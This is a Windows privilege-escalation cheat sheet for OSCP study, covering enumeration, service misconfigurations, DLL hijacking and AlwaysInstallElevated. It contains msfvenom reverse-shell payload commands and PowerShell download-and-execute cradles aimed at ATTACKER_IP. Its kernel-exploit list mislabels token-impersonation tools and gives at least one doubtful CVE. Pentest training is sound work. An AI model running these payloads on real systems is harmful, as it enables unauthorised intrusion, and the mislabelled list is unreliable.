# Windows Privilege Escalation

This guide covers common Windows privilege escalation techniques for the OSCP exam, focusing on identifying and exploiting misconfigurations and vulnerabilities in Windows systems.

## üìã Table of Contents
1. [Enumeration](#enumeration)
2. [Kernel Exploits](#kernel-exploits)
3. [Service Exploits](#service-exploits)
4. [DLL Hijacking](#dll-hijacking)
5. [Unquoted Service Paths](#unquoted-service-paths)
6. [AlwaysInstallElevated](#alwaysinstallelevated)
7. [Tools](#-tools)
8. [Practice](#-practice)

## Enumeration

### System Information
```powershell
# Basic system info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Environment variables
set

# Network info
ipconfig /all
route print
arp -a

# Running processes
tasklist /SVC
netstat -ano

# Installed software
dir "C:\Program Files"
dir "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

### User Information
```powershell
# Current user
whoami /all
whoami /groups | findstr "Mandatory"

# Other users
net user
net user [username]
net localgroup
net localgroup [groupname]

# Privileges
whoami /priv

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
net start
sc query
sc qc [service_name]

# Auto-runs
wmic startup get caption,command
```

## Kernel Exploits

### Finding Windows Version
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic os get version
```

### Common Kernel Exploits
- **PrintSpoofer**: CVE-2019-1385
- **JuicyPotato**: CLSID exploit
- **HotPotato**: NTLM relay attack
- **MS16-032**: Secondary Logon Handle
- **MS17-010**: EternalBlue

### Using Watson
```powershell
# Download and run Watson
# https://github.com/rasta-mouse/Watson
Watson.exe
```

## Service Exploits

### Unquoted Service Paths
```powershell
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Example exploit
# If path is C:\Program Files\Vulnerable Service\service.exe
# Create C:\Program.exe with reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > Program.exe
```

### Insecure Service Permissions
```powershell
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv [service_name]

# If you have SERVICE_CHANGE_CONFIG
sc config [service_name] binpath= "C:\path\to\malicious.exe"
sc stop [service_name]
sc start [service_name]
```

## DLL Hijacking

### Finding Vulnerable Services
```powershell
# Check service DLLs
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\"

# Check %PATH% for writable directories
for %i in ("%path:;=" "%") do @echo %i && icacls "%i" 2>nul | findstr /i "(F) (M) (W) :\" | findstr ":\" "
```

### Exploiting DLL Hijacking
1. Find a service that loads a DLL from a writable directory
2. Create a malicious DLL with your payload
3. Place it in the writable directory
4. Restart the service or wait for a reboot

## AlwaysInstallElevated

### Check Registry
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Create MSI Package
```bash
# On Kali
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o setup.msi

# On target
msiexec /quiet /qn /i C:\path\to\setup.msi
```

## üõ† Tools

### Local Enumeration
- **WinPEAS**: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEAS.ps1')"`
- **PowerUp.ps1**: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks"`
- **Seatbelt**: `Seatbelt.exe -group=all`
- **AccessChk**: Check service permissions

### Privilege Escalation Scripts
- **Watson**: Find missing patches
- **Sherlock**: Find missing patches (PowerShell)
- **JAWS**: Just Another Windows (Enum) Script

## üìö Resources
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [FuzzySecurity Windows Privilege Escalation](https://www.fuzzysecurity.com/tutorials/16.html)
- [Sushant's Windows PrivEsc Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

## üéØ Practice
1. [TryHackMe Windows PrivEsc Room](https://tryhackme.com/room/windows10privesc)
2. [Hack The Box Windows Machines](https://www.hackthebox.com/)
3. [VulnHub Windows Machines](https://www.vulnhub.com/)

## ‚ö†Ô∏è Legal Note
Only perform privilege escalation on systems you own or have explicit permission to test. Unauthorized testing is illegal.
